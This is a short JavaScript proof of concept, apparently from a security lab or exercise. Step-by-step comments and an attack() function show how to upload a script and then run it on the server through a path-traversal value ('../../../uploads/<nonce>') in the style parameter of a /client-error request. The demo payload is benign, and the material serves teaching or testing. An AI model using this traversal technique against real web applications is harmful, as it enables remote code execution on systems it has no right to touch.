// 1. Upload hello-world.js which writes to console.
// 2. Copy the nonce that appears in "Received upload * hello-world.js as <<NONCE>>.js"
// 3. Click back to get to the index page.
// 4. In the dev console type `let nonce = <<PASTE>>`
// 5. Copy/paste the function below into the dev console.
// 6. Type `attack(nonce)` in the dev console.
// 7. Show the log output where the console output shows that hello-world.js ran.

function attack (nonce) {
  const message = new window.XMLHttpRequest();
  const url = `${document.origin}/client-error?style=../../../uploads/${nonce}`;
  message.open('POST', url, true);
  message.send('message');
}

